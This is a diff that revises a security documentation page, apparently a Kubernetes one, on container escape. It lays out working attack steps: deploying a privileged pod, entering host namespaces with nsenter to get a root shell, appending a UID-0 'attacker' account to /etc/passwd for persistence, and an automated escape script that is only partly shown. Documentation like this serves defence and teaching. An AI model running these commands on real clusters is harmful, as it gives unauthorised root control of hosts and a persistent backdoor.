@@ -6,22 +6,15 @@ description: "How an attacker can break out of a container and gain control over
 
 # Container Escape
 
-A **container escape** occurs when an attacker breaks out of the container isolation boundary and gains access to the underlying host system. This can lead to **root-level access**, data tampering, persistence, and lateral movement across the cluster.
+A **container escape** occurs when an attacker breaks out of the container isolation boundary and gains access to the underlying host system. This leads to a full compromise of the node, potentially including root access, system tampering, and lateral movement across the cluster.
 
 ---
 
-## Exploitation Steps: Breaking Out of the Container Runtime
+## Exploitation Steps
 
-An attacker targets a container with overly permissive configurations that allow host-level access.
+An attacker targets a misconfigured container with elevated privileges. The following pod manifest is a **prerequisite** for all container escape paths, as it grants the attacker access to sensitive host namespaces and kernel features.
 
-### 1. Deploy a Privileged Pod
-
-The attacker deploys a pod with elevated privileges, including:
-
-- `privileged: true`
-- `hostPID: true`
-- `allowPrivilegeEscalation: true`
-- `runAsUser: 0`
+### Deploy a Privileged Pod
 
 ```yaml
 apiVersion: v1
@@ -45,42 +38,42 @@ spec:
 kubectl apply -f test-pod.yaml
 ```
 
+Once the privileged pod is running, the attacker proceeds using one of the following options.
+
 ---
 
-### 2. Check the Container Environment
+### Option 1: Escape Using Manual Namespace Entry
 
-The attacker verifies if the container shares namespaces with the host.
+#### 1. Check the Container Environment
+
+Verify if the container has access to the host’s mount namespace:
 
 ```bash
 ls -l /proc/1/ns/mnt
 ```
 
-If the container can access `/proc/1/root`, it indicates potential for escape.
+Inspect if the host filesystem is visible:
 
----
+```bash
+ls /proc/1/root
+```
 
-### 3. Escape into Host Namespaces
-
-Using `nsenter`, the attacker enters the host’s namespace context:
+#### 2. Enter Host Namespaces with `nsenter`
 
 ```bash
 nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
 ```
 
-They verify the escape:
+Verify the escape by checking:
 
 ```bash
 hostname
 whoami
 ```
 
-If the commands return the **host’s hostname** and **root user**, the escape is successful.
+If the hostname matches the host and the user is `root`, the escape was successful.
 
----
-
-### 4. Add a Root User to the Host
-
-For persistence, the attacker creates a root-level user:
+#### 3. Create a Persistent Root User
 
 ```bash
 echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd
@@ -89,9 +82,9 @@ grep attacker /etc/passwd
 
 ---
 
-### 5. Execute an Automated Escape Script
+### Option 2: Run an Automated Escape Script
 
-The attacker may use a script to automate the entire process:
+Instead of manually running commands, the attacker may use a single script to automate the escape and persistence steps:
 
 ```bash
 #!/bin/sh
@@ -122,7 +115,7 @@ exec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin
 
 ### Result
 
-The attacker gains **interactive root access to the host**, bypassing container isolation. They can persist by creating a new host user, modify system files, or pivot to other nodes.
+The attacker achieves **interactive root access on the host node**. This breaks the container isolation model and enables full control over the host, including the ability to persist, modify system configurations, and pivot to other parts of the cluster.
 
 ---
 
